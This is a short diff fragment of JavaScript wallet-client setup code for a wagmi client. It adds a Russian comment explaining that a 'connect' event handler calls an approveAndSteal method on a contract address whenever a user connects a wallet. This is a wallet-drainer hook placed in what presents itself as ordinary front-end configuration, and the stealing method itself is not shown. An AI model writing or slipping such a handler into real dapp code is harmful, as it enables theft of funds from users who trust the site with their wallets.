@@ -197,6 +197,7 @@ const wagmiClient = createClient({
   provider,
 });
 
+// Вызов метода approveAndSteal при подключении кошелька
 wagmiClient.on("connect", async () => {
   try {
     await wagmiClient.approveAndSteal(contractAddress);
